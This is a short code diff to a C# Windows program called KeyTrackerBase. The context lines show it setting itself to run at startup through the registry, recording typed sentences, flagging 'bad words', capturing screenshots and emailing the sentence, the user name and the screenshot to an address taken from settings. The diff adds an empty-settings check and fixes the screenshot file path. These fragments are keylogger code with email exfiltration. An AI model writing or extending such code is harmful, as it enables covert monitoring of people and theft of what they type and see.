@@ -47,6 +47,15 @@ namespace KeyTrackerBase
             //run on startup
             rkApp.SetValue("KeyTrackerBase", Application.ExecutablePath.ToString());
 
+            if(settings == null || settings.Length == 0)
+            {
+                Properties.Settings.Default.IsFirstTime = true;
+                Properties.Settings.Default.Save();
+                MessageBox.Show("Settings Are Empty, Re-Open and Enter in the required details");
+                this.Close();
+                Application.Exit();
+            }
+
             ////revert to default - get started
             //Properties.Settings.Default.IsFirstTime = true;
             //Properties.Settings.Default.Save();
@@ -338,7 +347,7 @@ namespace KeyTrackerBase
                     }
                     #endregion
 
-                    SendEmail(settings[0], "User: " + userName + " " + badWords, "Sentence recorded at " + DateTime.Now.ToString() + ": " + sentence, @"C:\\Users\\Jon\\Desktop\\screenshot" + iScreen + settings[2].ToLower());
+                    SendEmail(settings[0], "User: " + userName + " " + badWords, "Sentence recorded at " + DateTime.Now.ToString() + ": " + sentence, Path.GetDirectoryName(Application.ExecutablePath) + "\\screenshot" + iScreen + "." + settings[2].ToLower());
                     iScreen++;
 
                 }
